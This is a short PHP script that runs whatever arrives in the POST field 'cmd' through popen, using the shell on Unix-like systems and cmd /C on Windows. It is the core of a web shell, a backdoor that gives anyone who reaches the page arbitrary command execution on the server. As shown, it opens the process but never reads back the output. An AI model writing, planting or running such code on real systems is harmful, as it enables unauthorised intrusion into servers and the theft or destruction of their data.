<?php
function e($s) { 
	echo htmlspecialchars($s, ENT_QUOTES); 
}

$cmd = $_POST['cmd'];

e($cmd);
if (DIRECTORY_SEPARATOR == '/')
{
	$p = popen('exec 2>&1; ' . $cmd, 'r');
}
else
{
	$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
}
?>